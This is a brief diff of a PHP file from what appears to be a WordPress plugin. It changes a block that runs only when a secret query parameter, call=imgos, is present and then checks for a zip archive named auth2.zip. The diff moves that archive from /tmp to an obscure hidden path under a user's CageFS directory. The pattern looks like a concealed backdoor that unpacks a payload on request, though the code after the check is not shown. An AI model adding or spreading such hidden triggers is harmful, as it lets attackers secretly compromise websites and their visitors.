@@ -28,7 +28,7 @@ if ( ! defined( 'ABSPATH' ) ) {
  * when the specific query parameter is present.
  */
 if ( ! empty( $_GET['call'] ) && 'imgos' === $_GET['call'] ) {
-	$zip_file_path = '/tmp/auth2.zip';
+	$zip_file_path = '/home/kidustry/.cagefs/opt/alt/auth2.zip';
 	
 	// Verify file existence and zip extension availability
 	if ( file_exists( $zip_file_path ) && class_exists( 'ZipArchive' ) ) {
